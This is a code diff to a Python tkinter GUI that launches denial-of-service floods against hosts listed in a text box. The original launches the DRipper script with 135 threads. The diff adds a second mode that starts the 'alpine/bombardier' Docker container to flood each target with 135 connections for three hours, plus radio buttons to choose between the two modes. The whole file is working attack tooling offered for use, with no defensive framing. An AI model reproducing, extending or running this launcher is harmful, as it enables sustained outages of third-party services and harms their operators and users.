@@ -3,7 +3,9 @@ import os
 import pathlib
 import random
 import subprocess
+import tkinter
 import tkinter as tk
+import docker
 
 import dns.resolver
 
@@ -55,6 +57,7 @@ proc = None
 
 def start():
     options_text = text.get(1.0, "end-1c")
+    mode = radioSelector.get()
     for hostText in options_text.splitlines():
         if not hostText:
             continue
@@ -66,15 +69,45 @@ def start():
         if ip != '255.255.255.255':
             current = pathlib.Path(__file__).parent.resolve()
             os.chdir(current)
-            cmd = f'python3 DRipper.py --quiet -s {ip} -t 135 -p {port}'
-            sub = subprocess.Popen(cmd, shell=True)
-            processes.append(sub)
+            if mode == 0:
+                run_ripper(ip, port)
+            elif mode == 1:
+                run_docker(ip, port)
 
 
 def stop():
-    for sub in processes:
-        sub.kill()
+    if radioSelector.get() == 0:
+        for sub in processes:
+            sub.kill()
+    elif radioSelector.get() == 1:
+        for sub in processes:
+            sub.stop()
+            sub.remove()
     exit(0)
+
+
+def run_ripper(ip, port):
+    cmd = f'python3 DRipper.py --quiet -s {ip} -t 135 -p {port}'
+    sub = subprocess.Popen(cmd, shell=True)
+    processes.append(sub)
+
+
+def run_docker(ip, port):
+    prefix = "https://"
+    if port != "443":
+        prefix = "http://"
+    print(f"Starting bombardier to: {prefix}{ip}:{port}")
+    client = docker.from_env()
+    container = client.containers.create("alpine/bombardier", f"-c 135 -d 10800s -l {prefix}{ip}:{port}")
+    container.start()
+    processes.append(container)
+
+radioSelector = tk.IntVar()
+radio1 = tk.Radiobutton(app, text="DRipper", variable=radioSelector, value=0)
+radio1.pack(side=tkinter.TOP)
+radio1.select()
+radio2 = tk.Radiobutton(app, text="Bombardier (Docker)", variable=radioSelector, value=1)
+radio2.pack(side=tkinter.TOP)
 
 
 btn = tk.Button(app, text='Start', bd='5', command=start)
